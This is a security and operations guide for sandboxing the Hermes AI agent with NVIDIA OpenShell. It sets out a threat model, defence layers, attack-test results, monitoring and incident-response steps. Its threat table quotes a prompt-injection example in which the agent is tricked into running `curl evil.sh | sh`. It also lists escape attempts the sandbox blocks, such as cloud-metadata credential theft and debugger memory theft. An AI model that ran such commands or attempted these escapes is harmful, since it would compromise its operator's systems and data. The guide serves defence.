# 🔐 DevSecOps Guide: Hermes Agent in an NVIDIA OpenShell Sandbox

This guide explains **how we keep the Hermes AI agent secure**, how we **prove** it, and what to do **day to day and when something goes wrong**.

New to the setup? Read [README.md](README.md) first. 🙂

---

## 📖 Table of contents

1. [What "DevSecOps" means here 🤝](#-what-devsecops-means-here)
2. [What we protect, and from whom 🎯](#-what-we-protect-and-from-whom)
3. [Security in every stage of the lifecycle 🔄](#-security-in-every-stage-of-the-lifecycle)
4. [Layers of defence 🧅](#-layers-of-defence)
5. [Proof: Hermes with vs without OpenShell 🆚](#-proof-hermes-with-vs-without-openshell)
6. [Running the security tests yourself 🧪](#-running-the-security-tests-yourself)
7. [Changing the policy safely (policy as code) 📜](#-changing-the-policy-safely-policy-as-code)
8. [Secrets 🔑](#-secrets)
9. [Watching for trouble (monitoring) 👀](#-watching-for-trouble-monitoring)
10. [When something goes wrong (incident response) 🚨](#-when-something-goes-wrong-incident-response)
11. [Known risks we accept, for now 📋](#-known-risks-we-accept-for-now)
12. [Hardening roadmap 🗺️](#️-hardening-roadmap)
13. [Mapping to the OWASP Top 10 for LLM apps 🧭](#-mapping-to-the-owasp-top-10-for-llm-apps)

---

## 🤝 What "DevSecOps" means here

**DevSecOps = Development + Security + Operations.** Security isn't a final check at the end. It's built into every step, it's **automated**, and every claim is **backed by a test you can re-run**.

For this project, that means:

- ✍️ **Security as code.** The sandbox rules (`hermes/policy.yaml`) and the guardrail they must stay inside (`security/boundary.yaml`) are files in git. They're reviewed like any other code.
- 🤖 **Automated checks.** Every change to `sandbox/` runs secret scanning, linters, misconfiguration scanning and a **mathematical proof** of the policy in CI.
- 🧪 **Evidence over promises.** We attack Hermes with and without the sandbox and publish the results ([COMPARISON.md](security/COMPARISON.md)).
- 👀 **Continuous monitoring.** Every blocked connection is logged as a structured security event.
- 📋 **Honest risk tracking.** What we can't fix yet is written down, with an owner and a next step.

---

## 🎯 What we protect, and from whom

### 💎 Things worth protecting

| Asset | Why it matters |
|---|---|
| 🖥️ The server (host) | A takeover gives access to everything else. |
| ☁️ Cloud credentials via the metadata service (`169.254.169.254`) | They can grant access to the whole AWS account. |
| 🌉 Other services on the network (OpenCode bridge, SSH) | Lateral movement and abuse of paid or free APIs. |
| 💽 Server disk space (20 GB root) | When it fills up, Docker, Hermes and its data volume stop working. |
| 🔑 Secrets (dashboard password hash, API key, session secret) | They let someone take over Hermes. |
| 🤖 NVIDIA API key (`nvapi-…`, OpenShell provider `nvidia`) | Lets someone use our NVIDIA account and its rate limit, and impersonate us to NVIDIA. |
| 💬 Prompts and chat content sent to the model | They leave the server and are processed by NVIDIA-hosted models. |
| 🗂️ Hermes data (`hermes-data` volume: memory, sessions, config) | Private conversations and agent memory. |
| 🌐 The public front door: https://hermes.saqlainmushtaq.com (web UI + `/v1` API) | The way in for people and API clients. |
| 🏅 Origin certificate private key (`~/.config/hermes-sandbox/tls/origin.key`, once installed) | With it, someone could pretend to be our server to Cloudflare. |

### 🦹 Who or what could attack

| Threat | Example |
|---|---|
| 💉 **Prompt injection** | A web page, file or chat message tricks Hermes into running `curl evil.sh \| sh` or uploading data. |
| 🧩 **Malicious skill, plugin or tool** | Hermes loads code that quietly calls home. |
| 📦 **Supply-chain compromise** | A bad dependency inside the Hermes, Traefik or tunnel (Alpine) image. |
| 🌍 **Internet attacker** | Brute-forcing the login or the API key, exploiting Traefik, or reaching the server directly to skip Cloudflare (and fake headers such as `X-Forwarded-Proto`). |
| 😬 **Our own mistakes** | Someone opens the policy too wide "just to test". |

> 💡 **The key idea:** we assume Hermes **can** be tricked. The sandbox makes sure that even a fully compromised Hermes **can't do much damage**. Security people call this *limiting the blast radius*.

---

## 🔄 Security in every stage of the lifecycle

| Stage | What we do | Tool | Where |
|---|---|---|---|
| 📝 **Plan** | Threat model (above), and a boundary that defines the most access ever allowed | — | `SECURITY.md`, `security/boundary.yaml` |
| ✍️ **Code** | Policy and infrastructure as code. No secrets in git (`.gitignore` blocks `*.env`). | git, review | `hermes/policy.yaml`, `.gitignore` |
| 🏗️ **Build** | Pinned image versions (incl. `traefik:v3.7.15` and `alpine:3.24.2`, past the 2-week cooldown). Checksum-verified downloads. Non-root images. Alpine security updates at build time. | Docker | `hermes/Dockerfile`, `tunnel/Dockerfile`, `traefik/docker-compose.yml` |
| 🧪 **Test** | Secret scan, Dockerfile and shell lint, misconfig scan, policy proof (incl. the live effective policy with the NVIDIA provider rule), attack comparison, 27 functional and host-hygiene checks, **HTTPS checks from outside in 12 sections** (edge cert, exact Full (strict) origin check, redirect, headers, Secure cookie, origin locked to Cloudflare, chat over `wss://`, WebSockets idle 130 s, disk status, real-browser chat in Chrome with 3 min idle and reload). **Model acceptance gate:** a model becomes default or fallback only after `nvidia_bench.py` shows 100% correct answers, 100% tool call + follow-up and 0 errors/timeouts over 5 rounds. | gitleaks, hadolint, shellcheck, Trivy, OpenShell prover, `nvidia_bench.py` | `scripts/scan.sh`, `policy_check.sh`, `security_compare.sh`, `verify.sh`, `verify_https.sh`, `nvidia_bench.py`, `benchmarks/` |
| 📦 **Release** | CVE scan and SBOM (list of every component) for each image | Trivy (CycloneDX) | `scripts/scan.sh`, CI `images` job |
| 🚀 **Deploy** | Deny-by-default sandbox, least privilege, resource limits. **HTTPS only**, through Cloudflare → hardened Traefik (Cloudflare IPs only) → hardened tunnel container → OpenShell gateway → supervisor → Hermes ([architecture](README.md#architecture-at-a-glance)). | OpenShell, Docker, Traefik, Cloudflare | `scripts/up.sh`, `scripts/https_up.sh` |
| ⚙️ **Operate** | Live policy updates without downtime. Secret rotation, including the NVIDIA key (`set_nvidia_key.sh`, no sandbox re-create). Disciplined upgrades. Edge certificate renewed by Cloudflare automatically; origin certificate has **no auto-renewal**, so track its expiry. Keep Traefik's Cloudflare IP list current. Build cache pruned after every build; daily `housekeeping.sh`; rotated logs. | `openshell policy set`, openssl, `housekeeping.sh` | this guide, README Step 6 and "Disk space and logs" |
| 👀 **Monitor** | Structured (OCSF) security events for every allowed and denied action. Traefik JSON access log. Weekly CVE rescan. | `openshell logs`, `docker logs hermes-traefik`, CI schedule | this guide |

### 🤖 What CI checks automatically

The workflow is `.github/workflows/hermes-sandbox-security.yml`.

- **Every push or pull request** that touches `sandbox/` runs the `static` job, which must pass:
  - 🕵️ gitleaks: no secrets committed;
  - 🐳 hadolint: Dockerfile best practices (`hermes/` and `tunnel/`);
  - 🐚 shellcheck: shell-script bugs (26 shell scripts);
  - ⚙️ Trivy config: no HIGH or CRITICAL misconfigurations;
  - 📐 OpenShell prover: `policy.yaml` stays inside `boundary.yaml`, and 8 risky edits are caught. (Step 3, the live effective policy incl. the NVIDIA provider rule, needs the server and is a `SKIP` in CI.)
- **Every Monday, or on demand,** the `images` job runs CVE scans of the 3 images (Hermes, `traefik:v3.7.15`, `hermes-tunnel:0.1.6`) and builds an SBOM. The reports are saved as build artifacts.
- 📊 **Not in CI, on purpose:** the NVIDIA model benchmark (`scripts/nvidia_bench.py`). It uses real model quota, so it runs by hand before any model change (the acceptance gate above), and its report is committed under `benchmarks/` for review. Never loop it.

---

## 🧅 Layers of defence

An attacker has to get through **every** layer. Each one is enforced by something different, so a single mistake doesn't open everything.

| # | Layer | Enforced by | What it stops |
|---|---|---|---|
| 1 | ☁️ **Cloudflare edge**: browser-trusted HTTPS, HTTP → HTTPS redirect, HSTS, WAF, bot challenge, DDoS protection; the server's IP is hidden behind proxied DNS | Cloudflare | Snooping on the visitor's connection, floods, common web attacks, casual scanning |
| 2 | 🚦 **Traefik**: only Cloudflare's IP ranges allowed on **every** route (ports 80 and 443), TLS 1.2+, security headers; non-root, all capabilities dropped, read-only, **no Docker socket**; can reach only the tunnel, **not** the OpenShell gateway | Traefik, Docker, AWS security group | Bypassing Cloudflare, faking `X-Forwarded-Proto`, a Traefik bug becoming a host or gateway takeover |
| 3 | 🔌 **Tunnel container** (`hermes-tunnel`): OpenShell CLI only, no web server, uid 10001, all capabilities dropped, read-only, no published ports | Docker | A compromised edge reaching more than the two Hermes ports |
| 4 | 🔐 Dashboard login (`Secure` session cookie), plus an API key for `/v1` | Hermes (scrypt hashes, signed sessions) | Strangers using Hermes |
| 5 | 🌐 **No network card** in the Hermes container; every connection is checked against the policy | OpenShell supervisor | Data theft, downloading malware, attacking other machines |
| 6 | 🎯 Rules per program and per API path, even on the allowed model services (NVIDIA: 2 routes; bridge: 3 routes) | OpenShell (L7 REST) | Abusing the allowed services |
| 7 | 🔑 Provider credential injection: the NVIDIA key stays in OpenShell; Hermes sees only a placeholder | OpenShell supervisor | Stealing the NVIDIA key from inside the sandbox |
| 8 | 📂 Filesystem allow-list | Linux **Landlock** | Reading or writing anywhere else, staging payloads |
| 9 | 👤 Non-root user (uid 10000), no-new-privileges | Linux | Privilege escalation |
| 10 | 🧬 System-call filter | Linux **seccomp** | Debugging other processes (`ptrace`), kernel attack surface |
| 11 | 📏 2 CPUs, 4 GB memory, 2048 processes | Docker cgroups | Crashing the server (denial of service) |
| 12 | 📐 Policy proven inside the boundary | OpenShell prover, in CI | Someone loosening the rules by accident |

---

## 🆚 Proof: Hermes with vs without OpenShell

We ran the **same 23 attacks** (`security/probes.py`) as the same `hermes` user in both setups:

- **Without OpenShell:** the stock `nousresearch/hermes-agent:v0.22.5` in a plain `docker run`, on the same network as the OpenCode bridge. That's how Hermes usually runs.
- **With OpenShell:** this repo's sandbox.

### 📊 Result (2026-10-30)

| Outcome | Attacks |
|---|---|
| 🛡️ **Blocked only with OpenShell** | **17 of 23** |
| ➖ Blocked either way (Docker's defaults already stop them) | 5 |
| ⚠️ Allowed either way (accepted residual risk R5, see below) | 1 |
| ❗ Weaker in the sandbox | **0** |

**What OpenShell blocks that plain Docker doesn't:**

- 🌐 **Network:**
  - reaching the internet;
  - uploading stolen data;
  - DNS tunnelling;
  - **reading AWS cloud credentials** from the metadata service;
  - SSH to the host;
  - plain TCP to outside servers;
  - calling forbidden API paths on the allowed service;
  - having a network card at all.
- 📂 **Filesystem:**
  - staging files in `/var/tmp` and `/dev/shm`;
  - reading system files;
  - listing `/`.
- 🧬 **Process:**
  - setuid privilege gain;
  - root processes next to the agent;
  - **attaching a debugger to steal memory**;
  - reading other processes' environment.
- 📏 **Resources:** unlimited memory and process use.

👉 Full table with evidence for every attack: **[security/COMPARISON.md](security/COMPARISON.md)**

---

## 🧪 Running the security tests yourself

Run these on the server, from the repo root (except `verify_https.sh`, see below):

| Test | Command | What "good" looks like |
|---|---|---|
| ✅ Functional and security checks | `HERMES_DASHBOARD_PASSWORD='…' sandbox/scripts/verify.sh` | All PASS, 1 SKIP (27 checks; the model check is skipped unless `LLM_CHECKS=1`). With `LLM_CHECKS=1` on 2026-10-30: `25 passed, 2 failed`, both model checks, OpenCode free quota used up (R20). |
| 🔒 HTTPS front door (**from your laptop**, not the server: Cloudflare challenges data-centre IPs) | `HERMES_DASHBOARD_PASSWORD='…' CHAT_RUNNER=python sandbox/scripts/verify_https.sh` (then `--cleanup` on the server) | `0 failed`. On 2026-10-30 (server `44.202.117.9`, default run, incl. the real-browser section): `49 passed, 0 failed, 2 warnings`: the origin shows Traefik's default cert, and the `curl --resolve` Full (strict) check isn't trusted until the Cloudflare Origin Certificate is installed. |
| 🆚 With vs without comparison | `sandbox/scripts/security_compare.sh` | `weaker: 0, missing: 0`; the report is written to `security/COMPARISON.md` |
| 📐 Policy proof | `sandbox/scripts/policy_check.sh` | `10 passed, 0 failed` on the server (step 3 proves the live effective policy, incl. the `_provider_nvidia` rule); `9 passed` + 1 `SKIP` in CI |
| 📊 Model acceptance (only before a model change; uses quota) | `python3 sandbox/scripts/nvidia_bench.py`, then `--models a,b,c --requests 5 --confirm-of …` (README "NVIDIA models") | New default and fallbacks: 100% correct, 100% tool call + follow-up, 0 errors/timeouts over 5 rounds |
| 🔎 Scans and SBOM | `sandbox/scripts/scan.sh` | All PASS. Image CVEs are listed as INFO and match the risk register. |

> 🪙 **Model calls are opt-in.** `verify.sh`, `verify_https.sh` and `chat_e2e.py` send no prompt unless `LLM_CHECKS=1`; the demo sends real prompts only with `--with-llm`, capped by `LLM_BUDGET` (default 3 per run). Never loop the real model in automation; for QA use the default, exec-based path.

> 🧹 `security_compare.sh` starts a temporary plain-Docker Hermes container and **always removes it** afterwards. `verify.sh` deletes its own test chat sessions.

Sample `policy_check.sh` output:

```
1. The real policy must stay inside the boundary
  PASS  hermes/policy.yaml: within_boundary
2. Risky edits must be caught (anything but within_boundary)
  PASS  caught: open egress to api.github.com -> exceeds_boundary
  PASS  caught: let curl call the bridge -> exceeds_boundary
  PASS  caught: Landlock hard_requirement -> best_effort -> exceeds_boundary
  PASS  caught: make /etc writable -> unsupported
  PASS  caught: bridge rules in audit mode (log only, don't block) -> unsupported
  PASS  caught: allow every method and path on the bridge -> exceeds_boundary
  PASS  caught: run the workload as root (uid 0) -> exceeds_boundary
  PASS  caught: add a raw IP destination (1.1.1.1) -> exceeds_boundary

3. The live sandbox's effective policy (incl. provider rules) must stay inside the boundary
  PASS  effective policy of 'hermes': within_boundary

Result: 10 passed, 0 failed
```

> 📐 The **prover** is a mathematical solver (SMT), not a test that tries a few cases. `within_boundary` means *no possible* request in the modelled parts of the policy goes beyond the boundary.

> ⚠️ **`unsupported` is not a proof.** It means the prover couldn't model the change. Today that's true of **any** filesystem widening, such as making `/etc` writable, and of `audit` mode. Our script and CI **fail closed**: anything other than `within_boundary` counts as caught, as the OpenShell docs require. So for filesystem changes, the safety net is "a human must review this", not a mathematical proof.
>
> 🔍 One gap we found: deleting a rule's whole `binaries:` list still gives `within_boundary`. By the schema, an empty list matches **no** program, which means *less* access, so this is correct. Keep it in mind when reviewing, though.

---

## 📜 Changing the policy safely (policy as code)

Example: you want Hermes to read GitHub's API.

1. 🌿 **Create a branch** and edit `hermes/policy.yaml`. Add the smallest rule possible: one host, `read-only`, the exact binary.
2. 📐 **Run** `sandbox/scripts/policy_check.sh`. It will now say `exceeds_boundary`, because GitHub isn't in the boundary. **That's the point:** widening access is a deliberate decision.
3. 🧑‍⚖️ If the access is really needed, also add it to `security/boundary.yaml`. Explain *why* in the pull request. A second person reviews it, because the boundary is the guardrail.
4. 🤖 **CI** re-runs the prover and the scanners on the pull request.
5. 🚀 **Apply after merge:**
   - Network rules apply **live**, with no restart:
     ```bash
     openshell policy set hermes --policy sandbox/hermes/policy.yaml --wait
     ```
   - Filesystem and process rules need a re-create:
     ```bash
     sandbox/scripts/down.sh && sandbox/scripts/up.sh
     ```
6. ✅ **Re-run** `verify.sh` and `security_compare.sh`.

> 🚫 **Never** use `enforcement: audit`, wildcard binaries (`/**`) or `access: full` to "make it work". The prover flags all three.

---

## 🔑 Secrets

| Secret | Lives in | Never in |
|---|---|---|
| Dashboard password (plain) | Your password manager, and the operator's local `creds/hermes/` (`chmod 600`) | The server, git, chat |
| Password **hash**, session secret, API key | Server: `~/.config/hermes-sandbox/hermes.env` (`chmod 600`) | git (`.gitignore`), command-line arguments |
| 🏅 Origin certificate private key (once installed) | Server: `~/.config/hermes-sandbox/tls/origin.key` (`chmod 600`), mounted read-only into Traefik | git, chat, backups that leave the server unencrypted |
| 🤖 NVIDIA API key (`nvapi-…`) | **OpenShell provider `nvidia`** (set with `scripts/set_nvidia_key.sh`): Hermes only sees `openshell:resolve:env:NVIDIA_API_KEY`. Operator copy: `chmod 600` file in a `chmod 700` folder. Kubernetes: a Secret, see [KUBERNETES.md](KUBERNETES.md). | git, the image, the sandbox, command lines, logs, `config.yaml` |
| Other LLM or cloud API keys (future) | **OpenShell providers**, the same way | Hermes's environment variables, `config.yaml` |

How secrets reach Hermes:
- The dashboard values are sent with `--env-from`, so they never appear in `ps` output.
- `verify.sh` sends the test password through stdin, for the same reason.

### 🔄 Rotating secrets (do this every 90 days, or right away if you suspect a leak)

1. Generate new values. See README **Step 4**.
2. Update `~/.config/hermes-sandbox/hermes.env`.
3. Re-create the sandbox, since environment variables are set at creation:
   ```bash
   sandbox/scripts/down.sh && sandbox/scripts/up.sh
   ```
   Your data on the `hermes-data` volume is kept.
4. A new `HERMES_DASHBOARD_BASIC_AUTH_SECRET` logs **everyone** out, which is what you want after a leak.

🤖 **NVIDIA key** (no re-create needed):
1. Create a new key on [build.nvidia.com](https://build.nvidia.com).
2. On the server: `sandbox/scripts/set_nvidia_key.sh` (hidden prompt, or pipe the key on stdin). It updates the `nvidia` provider, restarts only the Hermes processes and checks the sandbox sees a placeholder.
3. Revoke the old key on build.nvidia.com. If a key was **exposed**, revoke it first.

---

## 👀 Watching for trouble (monitoring)

Every network decision is logged as an **OCSF** security event. OCSF is a standard format that SIEM tools such as Splunk, Elastic and Sentinel understand.

```bash
# 🔍 Everything Hermes was NOT allowed to do
openshell logs hermes -n 2000 | grep "DENIED"

# 📊 Which destinations get denied most
openshell logs hermes -n 2000 | grep DENIED \
  | sed -E 's/.*DENIED //; s/ \[(policy|reason).*//' | sort | uniq -c | sort -rn | head
```

| You see | Meaning | Action |
|---|---|---|
| `DENIED … hermes-agent.nousresearch.com`, `models.dev`, `openrouter.ai`, `raw.githubusercontent.com` | Hermes's background model-catalog lookups | 👍 Normal. Ignore. |
| `DENIED` to unknown hosts, **many times**, especially paste sites, IPs or odd domains | Possible prompt injection or a malicious tool trying to call home | 🚨 Follow the incident runbook below. |
| `DENIED … 169.254.169.254` outside of tests | Someone is hunting for cloud credentials | 🚨 Incident. |
| `Landlock` or `Permission denied` errors in Hermes logs | Hermes needs a path the policy doesn't allow | Check whether it's legitimate; if so, use the policy-change process. |
| Many `401` responses on `/auth/password-login` in Traefik's log (see below) | Password guessing | Find the visitor IPs in Cloudflare (**Security → Events**) and block them with a WAF rule. Make sure the password is strong. |

### 🚦 Traefik access log and certificates

Traefik writes one **JSON** line per request to its container log. Request headers are dropped. `ClientAddr` is the **Cloudflare edge** that connected, and `ClientHost` is taken from `X-Forwarded-For`: usually the real visitor, but a client can add values to that header, so for anything important cross-check the visitor IP in Cloudflare's **Security → Events**. Blocked requests on both ports (80 and 443) are logged.

```bash
# 🔑 Failed logins in the last hour (Hermes answers 401)
docker logs --since 1h hermes-traefik 2>&1 | grep '"RequestPath":"/auth/password-login"' | grep -c '"DownstreamStatus":401'

# 🔑 Failed API-key attempts in the last hour
docker logs --since 1h hermes-traefik 2>&1 | grep '"RequestPath":"/v1' | grep -c '"DownstreamStatus":401'

# 🧱 Requests that skipped Cloudflare and were refused (403)
docker logs --since 1h hermes-traefik 2>&1 | grep -c '"DownstreamStatus":403'

# 📅 Origin certificate expiry (no auto-renewal!)
openssl x509 -in ~/.config/hermes-sandbox/tls/origin.pem -noout -enddate
```

| You see | Meaning | Action |
|---|---|---|
| A **spike of `401`** on `/auth/password-login` (for example more than 20 in an hour) | Password guessing | Block the source in Cloudflare (**Security → WAF → Custom rules**). Check the password is strong. |
| Many `401` on `/v1/…` | Someone is guessing the API key | Rotate `API_SERVER_KEY` if there's any chance it leaked. |
| `403` responses | Someone found the server and tried to skip Cloudflare | 👍 Blocked. Restrict the AWS security group to Cloudflare ranges if it keeps happening. |
| Real visitors suddenly get `403` | Cloudflare added IP ranges Traefik doesn't know yet | Update the list in `sandbox/traefik/` from <https://www.cloudflare.com/ips/>. |
| Origin certificate expires in **less than 30 days** | It won't renew by itself | Replace it (README "Expiry and replacing the origin certificate") before Cloudflare shows **526**. |

> 📤 For a real deployment, ship these events to your SIEM. OpenShell can export OCSF JSON; see `docs/observability/ocsf-json-export.mdx` in the OpenShell repo.

---

## 🚨 When something goes wrong (incident response)

**Suspect Hermes was tricked or compromised?** Stay calm and follow the steps in order. 🧯

1. **🛑 Contain:** cut Hermes off **without destroying evidence**.
   ```bash
   docker compose -f sandbox/traefik/docker-compose.yml stop   # close the public door (Cloudflare shows 521)
   openshell sandbox stop hermes                               # freeze the agent
   ```
   🚧 **Want a block page instead of an error?** In Cloudflare → **Security → WAF → Custom rules**, add *Hostname equals `hermes.saqlainmushtaq.com`* → **Block**. It works in seconds and keeps Traefik's logs flowing for the investigation.

   🏅 **Origin key may have leaked?** In Cloudflare → **SSL/TLS → Origin Server**, **revoke** the certificate, then install a new one (README Steps 6.2–6.4).
2. **🧾 Preserve evidence** *before* deleting anything.
   ```bash
   mkdir -p ~/incident-$(date +%F) && cd ~/incident-$(date +%F)
   openshell logs hermes -n 2000 > openshell-events.log   # the CLI returns at most ~2000 lines
   docker logs hermes-traefik > traefik-access.log 2>&1
   docker logs hermes-tunnel > tunnel.log 2>&1
   docker run --rm -v hermes-data:/d:ro -v "$PWD:/o" alpine tar czf /o/hermes-data.tgz -C /d .
   ```
   > 📼 `openshell logs` only keeps the most recent ~2000 events. For real deployments, **record events continuously**, for example `openshell logs hermes --tail >> ~/hermes-events.log` as a service, or the OCSF JSON export, so evidence exists *before* an incident.
3. **🔍 Investigate:**
   - What was denied: `grep DENIED openshell-events.log`.
   - Which chat or session started it: the Sessions list in the dashboard, or `hermes-data.tgz`.
   - Who logged in or tried to: `traefik-access.log` (`/auth/password-login`), plus Cloudflare's **Security → Events** for the real visitor IPs.
4. **🧹 Eradicate:**
   - Rotate **all** secrets (see above), including the NVIDIA key: revoke it at build.nvidia.com and set a new one with `set_nvidia_key.sh`. If the server itself may be compromised, also revoke and replace the origin certificate.
   - Remove any bad skills, plugins or memory from `hermes-data`, or restore a clean backup.
   - Re-create the sandbox from the image.
5. **♻️ Recover:**
   - Run `sandbox/scripts/up.sh`, then `verify.sh` and `security_compare.sh`. All must pass.
   - Re-open the public door: `sandbox/scripts/https_up.sh` (and turn off any Cloudflare block rule), then run `verify_https.sh` from your laptop.
6. **📚 Learn:**
   - Write down what happened.
   - Tighten the policy or boundary, and add a probe to `security/probes.py` so the same attack is tested from now on.

---

## 📋 Known risks we accept, for now

No system is perfectly secure. These are the risks we know about, why they exist, and what we'll do about them.

| ID | Risk | Severity | Why it's accepted for now | Next step |
|---|---|---|---|---|
| R1 | 🔓 Dashboard on **plain HTTP** port 80 | ✅ Resolved | HTTPS at https://hermes.saqlainmushtaq.com: Cloudflare edge certificate for browsers, HTTP → HTTPS redirect, HSTS, `Secure` login cookie. Nothing publishes plain HTTP to the dashboard any more. The Cloudflare → server hop is tracked as R14. | Keep `verify_https.sh` passing |
| R2 | 🧱 Docker-published ports **skip UFW** | 🟡 Mitigated (Low) | Only Traefik publishes ports, and only 80/443. Traefik accepts requests **only from Cloudflare's IP ranges** (others get `403`). | Also restrict 80/443 in the AWS security group to Cloudflare's ranges |
| R3 | 🌉 OpenCode bridge (`sourcecheck-bridge`, **no authentication**) was published on **public `0.0.0.0:18383` and `[::]:18383`** | ✅ Resolved (2026-10-30) | Now published on **`127.0.0.1:18383` only** (`~/SourceCheck-Ai/docker-compose.yml`, container re-created). Hermes still reaches it (verified `200`): OpenShell's supervisor uses host networking and maps `host.openshell.internal` → `127.0.0.1`. Port 18383 is closed from the internet (verified). | `verify.sh` (section 8) and the demo's `reset.sh`/`run-all.sh` health checks fail if it's published anywhere but loopback |
| R4 | 🚪 OpenShell gateway: **no TLS or login**, runs as root with the Docker socket | Medium | Listens on loopback only; it's the trusted control plane | Enable mTLS (OpenShell docs); treat as a host-level component |
| R5 | 👶 Programs **started by Hermes inherit** its access to the model endpoints. OpenShell authorizes the connecting program **or one of its ancestors**. | Low | Limited to the bridge's 3 and NVIDIA's 2 allowed API routes (method + path enforced) | Keep the rule list minimal. Watch OpenShell for per-leaf binary options. |
| R6 | 🔑 Dashboard secrets are environment variables inside Hermes | Low | Hermes itself needs them. Two protections: Hermes strips these secrets from the environment of tools it runs, and the sandbox stops other processes reading `/proc/<pid>/environ` (`proc.read_agent_env` is blocked). | Use OpenShell providers for any real API keys (done for the NVIDIA key, R24) |
| R7 | 📦 Upstream Hermes image CVEs: **5 CRITICAL (2 fixable), 200 HIGH** (2026-10-30 scan) | Medium | Inside Nous Research's image. The sandbox removes most exploit paths: no network, non-root, Landlock, seccomp. | Weekly CI scan; upgrade Hermes when a patched tag ships |
| R8 | 🌐 Proxy nginx: 3 HIGH + 3 MEDIUM in 1.30.5 | ✅ Resolved | nginx 1.30.6 was released upstream on 2026-10-14, so it's past our 2-week **cooldown**. The Docker tag was only re-pushed on 2026-10-29. | Bumped to `nginx:1.30.6-alpine`; later nginx was **removed entirely** (Traefik + `hermes-tunnel` replaced the proxy). |
| R9 | 🐣 OpenShell is young (`0.1.x`) | Medium | Pinned version, tested behaviour, evidence in this repo | Track releases; re-run all tests on each upgrade |
| R10 | 👥 The server's login user is in the `docker` group, which is effectively root on the host | Medium | Needed to run Docker without sudo | Limit who can SSH to the server; use rootless Docker for production |
| R11 | 📂 The whole `/sandbox` workspace is writable (ephemeral apart from `/sandbox/hermes`) | Low | OpenShell can't mount the data volume as the workspace root | None needed; it's wiped on re-create |
| R12 | 🚪 Host port **31297** is open to the internet: the hosting platform's web-shell agent (root, self-signed TLS) | Medium | Belongs to the hosting platform, not this project | Ask the platform owner, or restrict it in the security group for non-lab servers |
| R13 | 👮 The OpenShell **supervisor** (trust anchor) runs with Docker **host networking** and no memory/PID limit (as `nobody`, all capabilities dropped, no-new-privileges) | Low | Its design: it makes the allowed connections for the sandbox | Track OpenShell's bridge-mode supervisor option (`supervisor_network_mode`) |
| R14 | 🔗 **Cloudflare → server hop not verified yet.** Until the Origin Certificate is installed, Traefik shows its self-signed default certificate and Cloudflare runs in **Full**: encrypted, but **not authenticated**. (**Flexible** would be plain HTTP; don't use it.) Also, any Cloudflare customer's traffic comes from the same Cloudflare IPs. | Medium | Live today; the hop runs only between Cloudflare and AWS, and the origin accepts Cloudflare IPs only | Install the **Cloudflare Origin Certificate** and switch to **Full (strict)** (README Step 6), then add **Authenticated Origin Pulls** |
| R15 | 🏅 **Origin private key compromise** (once installed): someone could impersonate the server to Cloudflare. **No auto-renewal** either: the certificate (up to 15 years) silently expires if nobody tracks it. | Low | `chmod 600`, outside git, mounted read-only into a non-root Traefik | On suspicion: **revoke** in Cloudflare and install a new certificate. Track the expiry date; consider a shorter validity |
| R16 | ☁️ **Cloudflare sees decrypted traffic**: TLS ends at Cloudflare's edge (needed for the WAF and DDoS protection), so passwords and chats are visible to Cloudflare | Low (demo) | Trusted provider; gives us the browser-trusted certificate, WAF and DDoS protection | For sensitive data: Cloudflare Access in front, or TLS straight to the server |
| R17 | 🚦 **Traefik is a new internet-facing component** | Medium | Pinned `v3.7.15` (2-week cooldown), non-root, all capabilities dropped, read-only, **no Docker socket**, dashboard/API off, only reachable via Cloudflare, can't reach the OpenShell gateway. Image scanned weekly by `scan.sh`/CI. | Track Traefik security releases; upgrade after the cooldown |
| R18 | 🔑 **Hermes API reachable from the internet** under `/v1` | Medium | Protected by the long random `API_SERVER_KEY`, Cloudflare WAF and the Cloudflare-only allow-list | Rotate the key every 90 days; add a Cloudflare rate limit for `/v1`, or keep `/v1` private if no outside client needs it |
| R19 | 📦 `traefik:v3.7.15` image: **2 HIGH** (Go stdlib CVE-2026-111943, go-jose CVE-2026-116587), plus 2 MEDIUM. v3.7.16 (published 2026-10-20) is built with a fixed Go, so it fixes the stdlib CVE and also GHSA-hrpp-p4fc-wwf8 (ForwardAuth NTLM/Negotiate leak; we use no ForwardAuth). It still ships go-jose v4.1.5, so **CVE-2026-116587 stays open** until a later release. The `hermes-tunnel:0.1.6` image has **0** CVEs. | Low | Supply-chain **cooldown**: we don't adopt releases younger than 2 weeks. go-jose is only used for JWT/OIDC features we don't enable. | Bump to `traefik:v3.7.16` on or after **2026-11-03**; watch for a release with go-jose ≥ 4.1.6; keep the weekly scan |
| R20 | 🪙 **LLM availability depends on a free tier.** Primary: the **NVIDIA API Catalog** free tier (about **40 requests/min**; no `429`s seen in 171 benchmark requests on 2026-10-30). A busy chat could hit the rate limit, and NVIDIA can change, time out or retire models (HTTP 410 with an EOL date). The OpenCode bridge is an optional alternative whose **account-wide** free quota was used up on 2026-10-30 (all free models: *"retry in 16h"*). | Low (availability) | Mitigated: default `nvidia/nemotron-3.5-super-vl-120b-a12b` plus **2 fallbacks from different families** (`openai/gpt-oss-20b`, `meta/muse-glimmer-30b`), all 5-round confirmed; Hermes tries them in order on error, timeout or rate limit (`fallback_providers:` in `hermes/config.yaml`). The OpenCode bridge stays available as a third option. Model calls in all test scripts are **opt-in** (`LLM_CHECKS=1`; demo `--with-llm` capped by `LLM_BUDGET`, default 3) | Re-run `nvidia_bench.py` before changing models and when NVIDIA retires one (acceptance gate). If the free tier isn't enough: a paid provider **with a spending cap**, see demo/README "Alternative model providers" |
| R21 | 💽 **Little disk headroom**: 20 GB root disk (ext4). On 2026-10-30 it reached 86% used / 2.8 GB free (Hermes showed *"disk is filling up"*), mostly ~4.5 GB of Docker build cache from rebuilding the 4.3 GB Hermes image. A full disk stops Docker and Hermes (availability). | Medium (availability) | Mitigated: `up.sh` and `https_up.sh` run `docker builder prune -af` after building; `housekeeping.sh` removes build cache, dangling images and old demo logs and warns below 4 GB free; `verify.sh`, `verify_https.sh` and the demo health checks fail if Hermes's disk pressure isn't `ok`. After cleanup: 69% used / 6.1 GB free. | **Operator:** install the daily job (`sandbox/scripts/housekeeping.sh --install-cron`). **Recommended:** grow the EBS volume to **40 GB gp3** (one rebuild needs ~4.5 GB transient), see README "Disk space and logs". Optional cleanup awaiting the owner's approval: `trivy-cache` volume (1.6 GB), ~28 anonymous volumes (~40 MB), unused images (~1 GB) |
